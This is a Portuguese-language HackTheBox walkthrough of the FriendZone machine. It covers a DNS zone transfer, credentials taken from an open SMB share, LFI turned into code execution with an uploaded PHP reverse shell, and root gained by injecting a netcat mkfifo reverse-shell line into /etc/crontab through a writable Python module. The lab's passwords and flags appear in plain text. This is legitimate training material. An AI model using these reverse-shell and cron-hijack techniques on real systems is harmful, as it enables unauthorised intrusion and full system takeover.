---
title: "FriendZone - HackTheBox"
date: 2024-01-18
published: true
lang: pt-BR
translation_key: "friendzone-htb"
original_url: /friendzone-htb
permalink: /pt-br/friendzone-htb
---
# [](#intro)Introdução

Olá, virgens. Hoje vamos estar resolvendo o pior problema de sempre: possuir o FriendZone no HackTheBox. Brincadeiras à parte, esta é uma máquina de dificuldade fácil que nos fornecerá mais conhecimento sobre transferências de zona DNS.
Você pode acessar esta caixa [here](https://app.hackthebox.com/machines/173).

# [](#level-description)Challenge description

Para a descrição leve, temos:

> FriendZone é uma dificuldade fácil Linux caixa que precisa de enumeração de quantidade justa. Ao fazer uma zona de transferência vhosts são descobertos. Existem compartilhamentos abertos no samba que fornece credenciais para um painel de administração. A partir daí, um LFI é encontrado que é alavancado para obter RCE. Um cron é encontrado rodando que usa um módulo gravável, tornando-o vulnerável ao sequestro.

Como podemos ver, estaremos realizando transferências de zona para encontrar VHosts (Hosts Virtuais).


# [](#approach)Aproxime-se da mentalidade

Para nossa mentalidade de abordagem, vamos separá-la como os seguintes passos:

1. Reconhecimento
2. Obtendo apoio
3. Enumeração do sistema
4. Aumento do privilégio


## [](#step1-recon)Passo 1 - Reconhecimento

Começamos por enumerar as portas TCP do sistema:

```bash
$ sudo nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A -Pn 10.129.35.124
# Nmap 7.94 scan initiated Thu Jan 18 13:12:35 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A -Pn 10.129.35.124
Warning: 10.129.35.124 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.35.124
Host is up (0.50s latency).
Not shown: 64930 closed tcp ports (reset), 598 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-p   Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Aggressive OS guesses: Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.13 (93%), Linux 3.18 (93%), Linux 3.2 - 4.9 (93%), DD-WRT v3.0 (Linux 4.4.2) (93%), Linux 4.10 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 2h22m34s, deviation: 1h09m10s, median: 3h02m30s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2024-01-18T18:21:42+02:00
| smb2-time: 
|   date: 2024-01-18T16:21:42
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   946.09 ms 10.10.16.1
2   946.18 ms 10.129.35.124

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 18 13:19:58 2024 -- 1 IP address (1 host up) scanned in 442.67 seconds
```
Como podemos ver, temos os portos 21, 22, 53, 80, 139, 443 e 445 abertos. Nada muito interessante sobre FTP, uma vez que o login anônimo está desativado. Ter a porta 53 aberta indica que temos uma escuta de serviço DNS no TCP, que é uma forte indicação de que este servidor não é apenas um cliente DNS, mas também um servidor DNS. Tipicamente, consultas DNS são tratadas sobre UDP, mas TCP é usado para operações que requerem confiabilidade e para respostas maiores, como transferências de zonas.

Também vemos que o nome comum TLS é friendzone.red. Dito isso, podemos ter uma maneira de transferir esse nome de domínio para o endereço IP da máquina e recuperar subdomínios sob esse nome. Para isso, usaremos a escavação:

```bash
$ dig axfr friendzone.red @10.129.35.124

; <<>> DiG 9.18.21 <<>> axfr friendzone.red @10.129.35.124
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 483 msec
;; SERVER: 10.129.35.124#53(10.129.35.124) (TCP)
;; WHEN: Thu Jan 18 17:07:52 UTC 2024
;; XFR size: 8 records (messages 1, bytes 289)
```
Daqui, vemos que temos muitos subdomínios apontando para este endereço, e a transferência foi bem sucedida. Para acessar esses endpoints, vamos adicioná-los ao nosso arquivo `/etc/hosts`: ```echo "10.129.35.124 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red >> /etc/hosts``.

Se tentarmos acessar o subdomínio do administrador, somos recebidos com uma página de login:

<img src="../figs/fz1.png" alt="admin login">

Mas não temos credenciais para entrar. A partir das informações da máquina, vemos que as credenciais são armazenadas em um compartilhamento SMB que tem acesso público. Vamos enumerar as ações e encontrar essas credenciais:

```bash
$ smbclient --no-pass -L 10.129.35.124

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
E depois de se conectar com `Development` e `general`, encontramos as credenciais neste último:

```bash
$ smbclient --no-pass //10.129.35.124/general
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 16 20:10:51 2019
  ..                                  D        0  Tue Sep 13 14:56:24 2022
  creds.txt                           N       57  Tue Oct  9 23:52:42 2018

                3545824 blocks of size 1024. 1540052 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
$ cat creds.txt
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
Depois disso, voltamos ao subdomínio `administrator1` para entrar com sucesso. Agora, temos acesso a este ponto final:

<img src="../figs/fz2.png" alt="admin dashboard">

A página parece estar pedindo parâmetros URL image id e pagename. Vamos descobrir o que acontece aqui quando passamos os parâmetros padrão sugeridos pela página:

<img src="../figs/fz3.png" alt="inside calls from dashboard">

Parece que a página é capaz de exibir outra página que reside no lado do servidor se passarmos em `pagename`. Isso não ajuda muito, no entanto, podemos ser capazes de enviar uma página de teste para alguns dos compartilhamentos SMB e acessá-lo com a técnica LFI. Acessando o compartilhamento Desenvolvimento com `smbclient`, vemos que somos capazes de enviar arquivos para ele:

```bash
smb: \> put creds.txt
putting file creds.txt as \creds.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \> dir
  .                                   D        0  Thu Jan 18 20:28:52 2024
  ..                                  D        0  Tue Sep 13 14:56:24 2022
  creds.txt                           A       57  Thu Jan 18 20:28:53 2024
```
No entanto, precisamos encontrar o caminho para este arquivo, a fim de exibi-lo sob o painel de administração. Para isso, estaremos usando o Nmap novamente:

```bash
$ nmap --script smb-enum-shares.nse 10.129.35.124 -p 445
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-18 17:27 UTC
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for friendzone.red (10.129.35.124)
Host is up (0.15s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.129.35.124\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
[...snip...]
```
Como podemos ver, o caminho para este diretório é `/etc/Development`. No entanto, depois de tentar exibir `creds.txt` na página, eu não tive sucesso. Talvez o serviço só exibe arquivos php? É isso que vamos tentar agora. Vamos criar um script php:

```php
<?php
echo '<h1>mula</h1>';
?>
```
salve-o em `test.php` e faça o upload para o compartilhamento Desenvolvimento. Agora, tentamos acessá-lo dando `pagename=/etc/Development/test`:

<img src="../figs/fz4.png" alt="successful LFI">

Confirmando a vulnerabilidade!

## [](#step3-foothold)Passo 2 - Obtendo apoio

Agora vamos enviar PentestMonkey shell reverso (você pode obtê-lo [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)) para o compartilhamento Desenvolvimento. Antes disso, altere as variáveis `$ip` e `$port` dentro da shell reversa para combinar com a de sua máquina local. Então, podemos enviá-lo para a máquina com SMB:

```bash
$ smbclient --no-pass //10.129.35.124/Development
Try "help" to get a list of possible commands.
smb: \> put rev-shell.php
putting file rev-shell.php as \rev-shell.php (9.4 kb/s) (average 9.4 kb/s)
```
Agora, iniciamos nosso netcat na porta que atribuímos na variável `$port` e passamos o parâmetro na URL `pagename=/etc/Development/rev-shell`:

```bash
$ nc -lvnp 1234
Connection from 10.129.35.124:37272
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 22:50:45 up  4:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
E estamos lá dentro! Depois de vasculhar os arquivos de web-service, encontrei um arquivo chamado `mysql_data.conf`, que continha o seguinte conteúdo:

```bash
$ pwd
/var/www/friendzone
$ ls
admin
friendzone
friendzoneportal
friendzoneportaladmin
html
mysql_data.conf
uploads
$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
Revelando a senha do usuário amigo para ser `Agpyu12!0.213$`. Mesmo que esta senha possa ser para o serviço MySQL, podemos tentar usá-la para SSH na máquina como `friend`. Veremos que esta é a senha do usuário SSH também:

```bash
friend@FriendZone:~$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
friend@FriendZone:~$ cat user.txt
627c48e56e0344b5b54fcd021f9bc8aa
```
# # [](#step3-crafting-the-attack)Passo 3 - enumeração do sistema

Usando LinPEAS, fui capaz de enumerar a máquina e encontrar arquivos graváveis em grupo. Estes são os mais interessantes para mim:

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                      
/dev/mqueue                                                                                                                            
/dev/shm
/etc/Development
/etc/Development/creds.txt
/etc/Development/hacked.php
/etc/Development/rev-shell.php
/etc/Development/test.php
/etc/sambafiles
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/var/lib/php/sessions
/var/mail/friend
/var/spool/samba
/var/tmp
```
No entanto, uma vez que devemos explorar crontabs, precisamos de maneiras de executar esses arquivos e configurar um cronjob para gerar uma shell root. Para que isso funcione, precisamos de um arquivo que está sendo executado como raiz que era possivelmente mundo gravável. No entanto, nenhum destes acima está sendo executado por raiz. Depois carreguei o PSPY para a máquina e encontrei estas linhas interessantes:

```bash
[...snip...]
2024/01/18 23:26:59 CMD: UID=0    PID=13     | 
2024/01/18 23:26:59 CMD: UID=0    PID=12     | 
2024/01/18 23:26:59 CMD: UID=0    PID=115    | 
2024/01/18 23:26:59 CMD: UID=0    PID=11     | 
2024/01/18 23:26:59 CMD: UID=0    PID=10     | 
2024/01/18 23:26:59 CMD: UID=0    PID=1      | /sbin/init splash 
2024/01/18 23:28:01 CMD: UID=0    PID=23018  | 
2024/01/18 23:28:01 CMD: UID=0    PID=23017  | /bin/sh -c /opt/server_admin/reporter.py 
2024/01/18 23:28:01 CMD: UID=0    PID=23016  | /usr/sbin/CRON -f 
[...snip...]
```
Há um processo sendo executado como root, que está relacionado a este arquivo `reporter.py`. Vamos dar uma olhadela.

```bash
friend@FriendZone:~$ cat /opt/server_admin/reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
Eu noto imediatamente que este script importa `os`, que apareceu em LinPEAS como um arquivo gravável em grupo. Se este for o caso, e repórter.py importa os, podemos escrever uma linha lá para adicionar automaticamente um cronjob para gerar uma shell reversa.

## [](#solving) Passo 4 - Aumento do privilégio

Podemos escrever estas linhas no arquivo `os.py`:

```python
shell = '''
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 4444 >/tmp/f
'''
f = open('/etc/crontab', 'a')
f.write(shell)
f.close()
```
Substituindo `<your-ip>` pelo IP da sua máquina local. Podemos ver que o cronjob foi adicionado com sucesso:

```bash
friend@FriendZone:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```
Começamos o netcat na porta 4444 e esperamos... Depois de um tempo, temos o shell raiz:

```bash
$ nc -lnvp 4444
Connection from 10.129.35.203:34736
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
132c1657472872848c0de6549a1d2a97
```
# [](#conclusions)Conclusão

Nesta CTF, aprendemos um pouco mais sobre transferências de zonas e cronjobs. Eu realmente gostei do processo para obter o shell do usuário, mas o sistema era bastante chato. Cada vez que eu tenho que me envolver com cronjobs, eu me tornar muito pouco entusiasmo e um pouco desinteressado. As tarefas relacionadas com o Cronjob muitas vezes resumem-se a esperar pelo momento certo ou verificar repetidamente arquivos de log, o que não dá a mesma emoção que aspectos mais interativos e dinâmicos da penetração e exploração do sistema.

No entanto, espero que tenha gostado desta escrita e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **!

<a href="/">Voltar</a>

